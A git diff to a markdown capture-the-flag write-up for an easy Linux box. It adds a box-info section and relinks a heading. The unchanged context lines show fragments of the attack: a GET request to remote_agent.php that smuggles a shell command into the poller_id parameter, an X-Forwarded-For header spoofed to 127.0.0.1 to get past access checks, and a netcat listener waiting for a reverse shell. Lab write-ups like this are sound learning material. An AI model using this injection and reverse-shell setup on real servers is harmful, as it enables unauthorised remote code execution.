@@ -1,3 +1,7 @@
+
+## 📌 Box Info
+- **OS**: [Linux](Linux)
+- **Difficulty**: [Easy](Easy)
 ## 🛰️ Recon
 
 ### Nmap
@@ -22,7 +26,7 @@ GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=$(
 Header: X-Forwarded-For: 127.0.0.1
 ```
 
-### Reverse Shell
+### [Reverse Shell](HTTP)
 ```bash
 nc -lvnp 443
 ```
